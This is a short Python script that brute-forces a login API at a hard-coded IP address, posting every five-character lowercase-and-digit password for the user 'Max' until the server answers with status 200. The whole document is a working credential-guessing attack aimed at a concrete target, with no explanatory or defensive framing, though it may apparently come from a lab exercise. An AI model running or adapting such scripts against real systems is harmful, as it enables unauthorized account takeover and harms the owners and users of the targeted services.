import requests
import itertools
import string

# Target information
url = "http://98.70.102.40:8080/api/auth/secure-login"
username = "Max"

# Characters to try (lowercase letters and digits)
characters = string.ascii_lowercase + string.digits

# Generate all possible 5-character combinations
for pw_tuple in itertools.product(characters, repeat=5):
    pw = ''.join(pw_tuple)
    data = {"username": username, "password": pw}
    res = requests.post(url, json=data)
    print(f"Trying: {pw} --> Status: {res.status_code}, Response: {res.text}")

    # Optional: break if login is successful (e.g., status code 200)
    if res.status_code == 200:
        print(f"\nSuccess! Password found: {pw}")
        break
